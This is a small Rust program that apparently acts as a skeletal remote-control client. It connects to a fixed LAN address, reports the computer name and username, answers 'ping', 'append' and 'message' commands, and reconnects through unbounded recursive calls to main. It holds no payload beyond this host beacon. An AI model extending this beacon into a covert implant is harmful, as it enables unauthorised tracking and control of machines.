#[allow(warnings)]

use std::io::{self, Read, Write};
use std::net::TcpStream;

const SERVER : &str = "192.168.2.220";
const PORT : &str = "5005";

fn read_bytes_as_string(mut stream: &TcpStream) -> String {
    let mut buffer = [0; 1024];
    match stream.read(&mut buffer) {
        Ok(bytes_read) => {
            String::from_utf8_lossy(&buffer[0..bytes_read]).to_string()
        }
        Err(_) => String::new(),
    }
}

fn main() {
    match TcpStream::connect(format!("{}:{}", SERVER, PORT)) {
        Ok(mut stream) => {
            let computer_name = hostname::get().unwrap().into_string().unwrap().into_bytes();
            let username = whoami::username();

            let client_object = format!("{{\"computer_name\": \"{}\", \"username\": \"{}\"}}", String::from_utf8_lossy(&computer_name), username);
            let mut buffer = [0; 1024];

            stream.write_all(client_object.as_bytes()).unwrap();
            loop {
                match stream.read(&mut buffer) {
                    Ok(0) | Err(_) => {
                        main();
                    }
                    Ok(bytes_read) => {
                        let command = String::from_utf8_lossy(&buffer[0..bytes_read]);
                        
                        match command.trim() {
                            "ping" => {
                                stream.write_all("ping".as_bytes()).unwrap();
                            }
                            "append" => {
                                stream.write_all("append".as_bytes()).unwrap();
                                main();
                            }
                            "message" => {
                                stream.write_all("message".as_bytes()).unwrap();

                                // Clear the buffer
                                buffer = [0; 1024];

                                // Read again to receive new data
                                let message = read_bytes_as_string(&stream);
                                println!("{}", message);

                                stream.write_all("message".as_bytes()).unwrap();
                            }
                            _ => {
                                continue;
                            }
                        }
                    }
                }
            }
        }
        Err(_) => {
            main();
        }
    }
}